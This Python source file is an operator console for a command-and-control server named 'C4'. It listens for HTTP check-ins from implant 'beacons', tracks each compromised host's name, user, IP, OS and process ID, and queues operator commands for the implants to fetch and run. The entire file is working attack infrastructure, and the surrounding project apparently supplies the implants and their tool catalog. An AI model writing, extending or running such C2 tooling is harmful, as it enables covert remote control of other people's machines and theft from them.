#!/usr/bin/env python3
"""
C4 Operator Console — TUI frontend for the C4 C2 server.

Listens for beacon check-ins on an HTTP port and provides an interactive
operator console for selecting beacons and issuing commands.

Usage:
    python console.py                  # listen on default port 9050
    python console.py --port 8443      # custom port
"""

from __future__ import annotations

import argparse
import asyncio
import json
import random
import shlex
import sys
import time
import uuid
from dataclasses import dataclass, field
from datetime import datetime, timezone
from pathlib import Path

import yaml

# Add build/ to path so we can import encode module
sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "build"))
from encode import (  # noqa: E402
    CodewordMap,
    ValueMap,
    encode as encode_action,
    load_codebook,
    load_value_codebook,
)

from aiohttp import web
from rich.text import Text
from textual import on, work
from textual.app import App, ComposeResult
from textual.binding import Binding
from textual.containers import Horizontal, Vertical
from textual.css.query import NoMatches
from textual.message import Message
from textual.reactive import reactive
from textual.widgets import (
    Footer,
    Header,
    Input,
    Label,
    ListItem,
    ListView,
    RichLog,
    Static,
)

# ---------------------------------------------------------------------------
# Tool catalog (loaded from implant_actions.yaml)
# ---------------------------------------------------------------------------

_ACTIONS_PATH = Path(__file__).resolve().parent.parent / "implant_actions.yaml"


@dataclass
class ToolParam:
    name: str
    type: str
    required: bool
    description: str


@dataclass
class ToolDef:
    name: str
    description: str
    params: list[ToolParam]

    @property
    def usage(self) -> str:
        parts = [self.name]
        for p in self.params:
            tag = f"<{p.name}>" if p.required else f"[{p.name}]"
            parts.append(tag)
        return " ".join(parts)


def _load_tools(path: Path = _ACTIONS_PATH) -> list[ToolDef]:
    if not path.exists():
        return []
    data = yaml.safe_load(path.read_text())
    tools: list[ToolDef] = []
    for name, spec in (data.get("tools") or {}).items():
        params = []
        for pname, pspec in (spec.get("parameters") or {}).items():
            params.append(
                ToolParam(
                    name=pname,
                    type=pspec.get("type", "string"),
                    required=pspec.get("required", False),
                    description=pspec.get("description", ""),
                )
            )
        tools.append(
            ToolDef(
                name=name,
                description=(spec.get("description") or "").strip(),
                params=params,
            )
        )
    return tools


TOOL_CATALOG: list[ToolDef] = _load_tools()

# ---------------------------------------------------------------------------
# Data model
# ---------------------------------------------------------------------------

STALE_SECONDS = 30  # beacon considered stale after this many seconds


@dataclass
class Beacon:
    id: str
    hostname: str
    username: str
    ip: str
    os: str
    pid: int
    first_seen: float
    last_seen: float
    alias: str | None = None
    command_queue: list[dict] = field(default_factory=list)

    @property
    def display_name(self) -> str:
        return self.alias or self.hostname

    @property
    def is_alive(self) -> bool:
        return (time.time() - self.last_seen) < STALE_SECONDS

    @property
    def status_text(self) -> str:
        return "alive" if self.is_alive else "stale"

    @property
    def last_seen_ago(self) -> str:
        delta = int(time.time() - self.last_seen)
        if delta < 60:
            return f"{delta}s ago"
        if delta < 3600:
            return f"{delta // 60}m {delta % 60}s ago"
        return f"{delta // 3600}h {(delta % 3600) // 60}m ago"


class BeaconRegistry:
    """Thread-safe-ish beacon store (single-threaded asyncio is fine)."""

    def __init__(self) -> None:
        self._beacons: dict[str, Beacon] = {}

    def checkin(self, data: dict) -> Beacon:
        bid = data.get("id") or str(uuid.uuid4())
        now = time.time()
        if bid in self._beacons:
            b = self._beacons[bid]
            b.hostname = data.get("hostname", b.hostname)
            b.username = data.get("username", b.username)
            b.ip = data.get("ip", b.ip)
            b.os = data.get("os", b.os)
            b.pid = data.get("pid", b.pid)
            b.last_seen = now
        else:
            b = Beacon(
                id=bid,
                hostname=data.get("hostname", "UNKNOWN"),
                username=data.get("username", "?"),
                ip=data.get("ip", "?"),
                os=data.get("os", "?"),
                pid=data.get("pid", 0),
                first_seen=now,
                last_seen=now,
            )
            self._beacons[bid] = b
        return b

    def get(self, key: str) -> Beacon | None:
        """Lookup by id or alias or hostname (case-insensitive)."""
        if key in self._beacons:
            return self._beacons[key]
        key_lower = key.lower()
        for b in self._beacons.values():
            if (
                b.alias and b.alias.lower() == key_lower
            ) or b.hostname.lower() == key_lower:
                return b
        return None

    def all(self) -> list[Beacon]:
        return list(self._beacons.values())

    def __len__(self) -> int:
        return len(self._beacons)


# ---------------------------------------------------------------------------
# HTTP listener
# ---------------------------------------------------------------------------

registry = BeaconRegistry()

# Will be set by the app once mounted so the handler can push UI updates.
_app_ref: C4Console | None = None


async def handle_checkin(request: web.Request) -> web.Response:
    try:
        data = await request.json()
    except (json.JSONDecodeError, Exception):
        return web.json_response({"error": "bad json"}, status=400)

    beacon = registry.checkin(data)

    # Queue: return any pending commands back to the beacon
    commands = beacon.command_queue[:]
    beacon.command_queue.clear()

    # Notify TUI via message (safe cross-context)
    if _app_ref is not None:
        _app_ref.post_message(C4Console.BeaconCheckin(beacon.id))

    return web.json_response({"status": "ok", "commands": commands})


async def start_http(port: int) -> web.AppRunner:
    app = web.Application()
    app.router.add_post("/beacon", handle_checkin)
    runner = web.AppRunner(app, access_log=None)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", port)
    await site.start()
    return runner


# ---------------------------------------------------------------------------
# TUI Widgets
# ---------------------------------------------------------------------------


class BeaconListItem(ListItem):
    """A single entry in the beacon sidebar."""

    def __init__(self, beacon: Beacon) -> None:
        super().__init__()
        self.beacon = beacon

    def compose(self) -> ComposeResult:
        status = "●" if self.beacon.is_alive else "○"
        color = "green" if self.beacon.is_alive else "red"
        yield Label(
            f"[{color}]{status}[/] {self.beacon.display_name}",
            markup=True,
        )


class BeaconDetailPanel(Static):
    """Shows metadata for the currently selected beacon."""

    def update_beacon(self, beacon: Beacon | None) -> None:
        if beacon is None:
            self.update("[dim]No beacon selected[/]")
            return
        lines = [
            "[bold cyan]BEACON DETAIL[/]",
            "",
            f"  [bold]ID:[/]       {beacon.id[:12]}",
            f"  [bold]Host:[/]     {beacon.hostname}",
            f"  [bold]User:[/]     {beacon.username}",
            f"  [bold]IP:[/]       {beacon.ip}",
            f"  [bold]OS:[/]       {beacon.os}",
            f"  [bold]PID:[/]      {beacon.pid}",
            f"  [bold]Alias:[/]    {beacon.alias or '—'}",
            f"  [bold]Status:[/]   {'[green]alive[/]' if beacon.is_alive else '[red]stale[/]'}",
            f"  [bold]Checkin:[/]  {beacon.last_seen_ago}",
            f"  [bold]First:[/]    {datetime.fromtimestamp(beacon.first_seen, tz=timezone.utc).strftime('%H:%M:%S UTC')}",
            f"  [bold]Queued:[/]   {len(beacon.command_queue)} cmd(s)",
        ]
        self.update("\n".join(lines))


# ---------------------------------------------------------------------------
# Main App
# ---------------------------------------------------------------------------


class C4Console(App):
    """C4 Operator Console."""

    class BeaconCheckin(Message):
        """Posted by the HTTP handler when a beacon checks in."""

        def __init__(self, beacon_id: str) -> None:
            super().__init__()
            self.beacon_id = beacon_id

    TITLE = "C4 Operator Console"
    CSS = """
    Screen {
        layout: vertical;
    }

    #main-area {
        height: 1fr;
    }

    #beacon-sidebar {
        width: 30;
        border-right: solid $accent;
        height: 100%;
    }

    #sidebar-title {
        text-style: bold;
        color: $text;
        background: $boost;
        padding: 0 1;
        width: 100%;
    }

    #beacon-list {
        height: 1fr;
    }

    #right-area {
        width: 1fr;
        height: 100%;
    }

    #detail-panel {
        height: auto;
        max-height: 16;
        padding: 1 2;
        border-bottom: solid $accent;
    }

    #interaction-area {
        height: 1fr;
        padding: 0;
    }

    #interaction-title {
        text-style: bold;
        color: $text;
        background: $boost;
        padding: 0 1;
        width: 100%;
    }

    #interaction-log {
        height: 1fr;
    }

    #cmd-input {
        dock: bottom;
    }

    #no-session {
        height: 1fr;
        content-align: center middle;
        color: $text-muted;
    }
    """

    BINDINGS = [
        Binding("ctrl+q", "quit", "Quit", show=True),
        Binding("ctrl+b", "focus_beacons", "Beacons", show=True),
        Binding("ctrl+i", "focus_input", "Input", show=True),
    ]

    selected_beacon: reactive[Beacon | None] = reactive(None)
    interacting_beacon: reactive[Beacon | None] = reactive(None)
    listen_port: int = 9050

    def compose(self) -> ComposeResult:
        yield Header()
        with Horizontal(id="main-area"):
            with Vertical(id="beacon-sidebar"):
                yield Label("BEACONS", id="sidebar-title")
                yield ListView(id="beacon-list")
            with Vertical(id="right-area"):
                yield BeaconDetailPanel(id="detail-panel")
                with Vertical(id="interaction-area"):
                    yield Label("SESSION — none", id="interaction-title")
                    yield RichLog(id="interaction-log", highlight=True, markup=True)
                    yield Input(
                        placeholder="Type a command or 'help'...",
                        id="cmd-input",
                    )
        yield Footer()

    def on_mount(self) -> None:
        global _app_ref
        _app_ref = self
        self._log("[bold cyan]C4 Operator Console[/] started")
        self._log(f"Listening on [bold]0.0.0.0:{self.listen_port}[/]")
        self._log("Waiting for beacons...\n")
        self._log(
            "[dim]Commands: beacons, interact <name>, alias <id> <name>, back, quit, help[/]\n"
        )
        self._start_listener()
        self._start_status_refresh()

    @work(exclusive=True, group="http")
    async def _start_listener(self) -> None:
        self._runner = await start_http(self.listen_port)

    @work(exclusive=True, group="status")
    async def _start_status_refresh(self) -> None:
        """Periodically refresh the beacon list to update stale indicators."""
        while True:
            await asyncio.sleep(5)
            self.refresh_beacons()

    # -- Beacon checkin notification -------------------------------------

    def on_c4_console_beacon_checkin(self, event: BeaconCheckin) -> None:
        beacon = registry.get(event.beacon_id)
        if beacon:
            self._log(
                f"[green]✓[/] Beacon check-in: [bold]{beacon.display_name}[/] ({beacon.ip})"
            )
        self.refresh_beacons()

    # -- Beacon list management ------------------------------------------

    def refresh_beacons(self) -> None:
        """Rebuild the beacon ListView from the registry."""
        try:
            lv: ListView = self.query_one("#beacon-list", ListView)
        except NoMatches:
            return
        lv.clear()
        for beacon in registry.all():
            lv.append(BeaconListItem(beacon))

        # Also refresh detail if a beacon is selected
        if self.selected_beacon:
            fresh = registry.get(self.selected_beacon.id)
            if fresh:
                self.selected_beacon = fresh
                self._update_detail(fresh)

    @on(ListView.Selected, "#beacon-list")
    def beacon_selected(self, event: ListView.Selected) -> None:
        item = event.item
        if isinstance(item, BeaconListItem):
            self.selected_beacon = item.beacon
            self._update_detail(item.beacon)

    def _update_detail(self, beacon: Beacon | None) -> None:
        try:
            panel: BeaconDetailPanel = self.query_one(
                "#detail-panel", BeaconDetailPanel
            )
            panel.update_beacon(beacon)
        except NoMatches:
            pass

    # -- Command input ---------------------------------------------------

    @on(Input.Submitted, "#cmd-input")
    def on_command(self, event: Input.Submitted) -> None:
        raw = event.value.strip()
        event.input.value = ""
        if not raw:
            return

        # Parse command
        parts = raw.split()
        cmd = parts[0].lower()

        if cmd == "help":
            self._log(
                "\n[bold]Commands:[/]\n"
                "  [cyan]beacons[/]              — list all beacons\n"
                "  [cyan]interact <name|id>[/]   — start session with a beacon\n"
                "  [cyan]alias <id> <name>[/]    — set a beacon alias\n"
                "  [cyan]tools[/]                — show available beacon tools\n"
                "  [cyan]back[/]                 — exit current session\n"
                "  [cyan]quit[/]                 — exit console\n"
            )
        elif cmd == "tools":
            self._show_tool_catalog()
        elif cmd == "beacons":
            self._show_beacon_table()
        elif cmd == "interact":
            if len(parts) < 2:
                self._log("[red]Usage: interact <name|id>[/]")
                return
            self._enter_session(parts[1])
        elif cmd == "alias":
            if len(parts) < 3:
                self._log("[red]Usage: alias <id|hostname> <new_alias>[/]")
                return
            self._set_alias(parts[1], parts[2])
        elif cmd == "back":
            self._exit_session()
        elif cmd == "quit" or cmd == "exit":
            self.exit()
        else:
            # If we have an active session, treat as beacon command
            if self.interacting_beacon:
                self._send_command(raw)
            else:
                self._log(
                    f"[red]Unknown command:[/] {raw}. Type [cyan]help[/] for commands."
                )

    # -- Session management ----------------------------------------------

    def _enter_session(self, name: str) -> None:
        beacon = registry.get(name)
        if not beacon:
            self._log(f"[red]Beacon not found:[/] {name}")
            return
        self.interacting_beacon = beacon
        self.selected_beacon = beacon
        self._update_detail(beacon)
        try:
            title: Label = self.query_one("#interaction-title", Label)
            title.update(f"SESSION — {beacon.display_name}")
            inp: Input = self.query_one("#cmd-input", Input)
            inp.placeholder = f"C4 ({beacon.display_name}) > "
        except NoMatches:
            pass
        self._log(
            f"\n[bold green]Entered session with {beacon.display_name}[/] ({beacon.id[:12]})"
        )
        self._log(
            "[dim]Type commands to send. 'back' to return. 'tools' to list available tools.[/]\n"
        )
        self._show_tool_catalog()

    def _exit_session(self) -> None:
        if not self.interacting_beacon:
            self._log("[dim]No active session.[/]")
            return
        name = self.interacting_beacon.display_name
        self.interacting_beacon = None
        try:
            title: Label = self.query_one("#interaction-title", Label)
            title.update("SESSION — none")
            inp: Input = self.query_one("#cmd-input", Input)
            inp.placeholder = "Type a command or 'help'..."
        except NoMatches:
            pass
        self._log(f"[yellow]Exited session with {name}[/]\n")

    def _send_command(self, raw: str) -> None:
        beacon = self.interacting_beacon
        if not beacon:
            return
        cmd_entry = {
            "id": str(uuid.uuid4())[:8],
            "command": raw,
            "queued_at": time.time(),
        }
        beacon.command_queue.append(cmd_entry)
        self._log(f"[bold]C4[/] ({beacon.display_name}) > {raw}")
        self._log(
            f"  [dim]queued → {cmd_entry['id']}  ({len(beacon.command_queue)} pending)[/]"
        )

    # -- Alias -----------------------------------------------------------

    def _set_alias(self, key: str, alias: str) -> None:
        beacon = registry.get(key)
        if not beacon:
            self._log(f"[red]Beacon not found:[/] {key}")
            return
        old = beacon.display_name
        beacon.alias = alias
        self._log(f"[green]Aliased[/] {old} → [bold]{alias}[/]")
        self.refresh_beacons()

    # -- Tool catalog ----------------------------------------------------

    def _show_tool_catalog(self) -> None:
        if not TOOL_CATALOG:
            self._log("[dim]No tools loaded (implant_actions.yaml not found).[/]")
            return
        self._log("[bold cyan]Available Tools:[/]")
        for t in TOOL_CATALOG:
            self._log(f"  [bold green]{t.usage}[/]")
            self._log(f"    [dim]{t.description}[/]")
            for p in t.params:
                req = "[bold red]*[/]" if p.required else " "
                self._log(f"    {req} [cyan]{p.name}[/] ({p.type}) — {p.description}")
        self._log("")

    # -- Beacon table ----------------------------------------------------

    def _show_beacon_table(self) -> None:
        beacons = registry.all()
        if not beacons:
            self._log("[dim]No beacons registered.[/]")
            return
        self._log("\n[bold]Active Beacons:[/]")
        for b in beacons:
            status = "[green]●[/]" if b.is_alive else "[red]○[/]"
            self._log(
                f"  {status} {b.display_name:<20} {b.ip:<16} {b.username:<12} {b.last_seen_ago}"
            )
        self._log("")

    # -- Logging ---------------------------------------------------------

    def _log(self, msg: str) -> None:
        try:
            log: RichLog = self.query_one("#interaction-log", RichLog)
            log.write(Text.from_markup(msg))
        except NoMatches:
            pass

    # -- Actions ---------------------------------------------------------

    def action_focus_beacons(self) -> None:
        try:
            self.query_one("#beacon-list", ListView).focus()
        except NoMatches:
            pass

    def action_focus_input(self) -> None:
        try:
            self.query_one("#cmd-input", Input).focus()
        except NoMatches:
            pass


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------


def main() -> None:
    parser = argparse.ArgumentParser(description="C4 Operator Console")
    parser.add_argument(
        "--port", type=int, default=9050, help="Listener port (default: 9050)"
    )
    args = parser.parse_args()

    app = C4Console()
    app.listen_port = args.port
    app.run()


if __name__ == "__main__":
    main()
